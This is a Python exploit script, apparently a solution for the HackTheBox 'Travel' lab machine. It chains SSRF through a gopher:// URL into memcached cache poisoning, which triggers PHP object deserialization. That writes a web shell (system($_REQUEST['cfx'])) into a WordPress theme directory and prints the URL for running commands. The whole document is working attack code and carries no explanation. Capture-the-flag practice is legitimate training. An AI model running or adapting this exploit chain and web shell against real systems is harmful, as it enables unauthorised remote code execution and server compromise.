#Author: ColdFusionX

import requests
import urllib

web = "http://blog.travel.htb"

attack = 'O:14:"TemplateHelper":2:{s:4:"file";s:7:"cfx.php";s:4:"data";s:34:"<?php system($_REQUEST['cfx']); ?>";}'
#Cache Key Construction   "xct_"+ md5(md5($feed_url)+":"+"spc")

gop = "%0d%0aset xct_4e5612ba079c530a6b1f148c0b352241 4 0 "+ str(len(attack)) +"%0d%0a"+ attack +"%0d%0a"

final_payload = "gopher://LOCALHOST:11211/_"+urllib.quote_plus(gop).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")

# print(final_payload)

print ("[*] SSRF ")
mainURL=web+"/awesome-rss/?debug=true&custom_feed_url="+final_payload
r = requests.get(mainURL)
print(r.status_code)
print ("[*] Triggering Deserialization")
x = requests.get(web+'/awesome-rss')
finalURL = web+"/wp-content/themes/twentytwenty/logs/cfx.php"
r2 = requests.get(finalURL)
print(r2.status_code)

print ("[*] Getting RCE")
print ('[*] Input commands in cfx ==>  http://blog.travel.htb/wp-content/themes/twentytwenty/logs/cfx.php?cfx=id')
